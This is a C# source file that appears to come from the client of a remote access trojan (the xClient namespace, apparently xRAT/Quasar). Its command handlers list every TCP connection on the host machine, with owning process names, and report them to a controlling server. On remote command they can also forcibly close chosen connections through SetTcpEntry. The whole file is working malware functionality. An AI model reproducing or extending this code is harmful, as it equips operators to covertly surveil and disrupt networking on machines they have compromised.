using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using xClient.Core.Networking;
using xClient.Core.Packets.ServerPackets;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE TCP Connections COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetConnections(Client client, GetConnections packet)
        {
            MIB_TCPROW_OWNER_PID[] table = GetTable();
            string[] Processes = new string[table.Length];
            string[] LocalAddresses = new string[table.Length];
            string[] LocalPorts = new string[table.Length];
            string[] RemoteAddresses = new string[table.Length];
            string[] RemotePorts = new string[table.Length];
            byte[] States = new byte[table.Length];

            /*int i = 0;
            foreach (string proc in Processes)*/

            for (int i = 0; i < table.Length; i++)
            {
                LocalAddresses[i] = string.Format("{0}", table[i].LocalAddress);
                LocalPorts[i] = string.Format("{0}", table[i].LocalPort);
                RemoteAddresses[i] = string.Format("{0}", table[i].RemoteAddress);
                RemotePorts[i] = string.Format("{0}", table[i].RemotePort);
                States[i] = Convert.ToByte(table[i].state);

                try
                {
                    Process p = Process.GetProcessById((int)table[i].owningPid);
                    Processes[i] = p.ProcessName;
                }
                catch
                {
                    Processes[i] = string.Format("PID: {0}", table[i].owningPid);
                }
                                
            }

            new Packets.ClientPackets.GetConnectionsResponse(Processes, LocalAddresses, LocalPorts, RemoteAddresses, RemotePorts, States).Execute(client);

            }

        public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
        {
            MIB_TCPROW_OWNER_PID[] table = GetTable();
            bool matchFound = false; // handle if connections's ports found
            for (int i = 0; i < table.Length; i++)
            {
                //search for connection by Local and Remote Ports
                if ((packet.LocalPort.ToString() == table[i].LocalPort.ToString()) &&
                    (packet.RemotePort.ToString() == table[i].RemotePort.ToString()))
                    // it will close the connection only if client run as admin
                {
                    matchFound = true;
                    //table[i].state = (byte)ConnectionStates.Delete_TCB;
                    table[i].state = 12;  // 12 for Delete_TCB state
                    IntPtr ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                    Marshal.StructureToPtr(table[i], ptr, false);
                    int ret = SetTcpEntry(ptr);
                }
            }
            if (matchFound) { HandleGetConnections(client, new GetConnections()); }
        }

        public static MIB_TCPROW_OWNER_PID[] GetTable()
        {
            MIB_TCPROW_OWNER_PID[] tTable;
            int AF_INET = 2;
            int buffSize = 0;
            uint ret = GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL);
            IntPtr buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                ret = GetExtendedTcpTable(buffTable, ref buffSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL);
                if (ret != 0)
                    return null;
                MIB_TCPTABLE_OWNER_PID tab = (MIB_TCPTABLE_OWNER_PID)Marshal.PtrToStructure(buffTable, typeof(MIB_TCPTABLE_OWNER_PID));
                IntPtr rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new MIB_TCPROW_OWNER_PID[tab.dwNumEntries];
                for (int i = 0; i < tab.dwNumEntries; i++)
                {
                    MIB_TCPROW_OWNER_PID tcpRow = (MIB_TCPROW_OWNER_PID)Marshal.PtrToStructure(rowPtr, typeof(MIB_TCPROW_OWNER_PID));
                    tTable[i] = tcpRow;
                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
                }

            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
            return tTable;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_TCPROW_OWNER_PID
        {
            public UInt32 state;
            public UInt32 localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public byte[] localPort;
            public UInt32 remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public byte[] remotePort;
            public UInt32 owningPid;

            public System.Net.IPAddress LocalAddress
            {
                get
                {
                    return new System.Net.IPAddress(localAddr);
                }
            }

            public ushort LocalPort
            {
                get
                {
                    return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0);
                }
            }

            public System.Net.IPAddress RemoteAddress
            {
                get
                {
                    return new IPAddress(remoteAddr);
                }
            }

            public ushort RemotePort
            {
                get
                {
                    return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0);
                }
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_TCPTABLE_OWNER_PID
        {
            public uint dwNumEntries;
            MIB_TCPROW_OWNER_PID table;
        }
        enum TCP_TABLE_CLASS
        {
            TCP_TABLE_BASIC_LISTENER,
            TCP_TABLE_BASIC_CONNECTIONS,
            TCP_TABLE_BASIC_ALL,
            TCP_TABLE_OWNER_PID_LISTENER,
            TCP_TABLE_OWNER_PID_CONNECTIONS,
            TCP_TABLE_OWNER_PID_ALL,
            TCP_TABLE_OWNER_MODULE_LISTENER,
            TCP_TABLE_OWNER_MODULE_CONNECTIONS,
            TCP_TABLE_OWNER_MODULE_ALL
        }

        [DllImport("iphlpapi.dll", SetLastError = true)]
        static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TCP_TABLE_CLASS tblClass, UInt32 reserved = 0);

        [DllImport("iphlpapi.dll")]
        private static extern int SetTcpEntry(IntPtr pTcprow);

    }    

}

